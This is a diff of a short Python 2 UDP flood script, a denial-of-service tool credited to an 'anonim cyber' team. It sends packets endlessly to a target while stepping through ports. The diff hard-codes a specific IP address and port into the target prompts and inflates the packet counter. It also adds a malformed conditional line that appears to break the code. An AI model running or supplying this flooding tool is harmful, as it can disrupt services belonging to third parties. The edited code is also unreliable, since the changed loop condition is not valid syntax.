@@ -31,8 +31,8 @@ print (H+"Author   : vTersenyumlah")
 print (H+"TEAM     : Pancasila anonim cyber")
 print (H+"Thanks   : All Member Panoc")
 print
-ip = raw_input(R+"IP Target : ")
-port = input(R+"Port       : ")
+ip = raw_input(R+"IP Target : 51.79.218.114")
+port = input(R+"Port       : 7771")
 
 os.system("clear")
 os.system("figlet Packet Starting")
@@ -46,11 +46,11 @@ print "[===============     ] 75%"
 time.sleep(1)
 print "[====================] 100%"
 time.sleep(1)
-sent = 0
+sent = 1000
 while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
      print (R+"Sent %s packet to %s throught port %s"%(sent,ip,port))
-     if port == 65534:
-       port = 1
+     if port == 65534: 7771
+       port = 7771
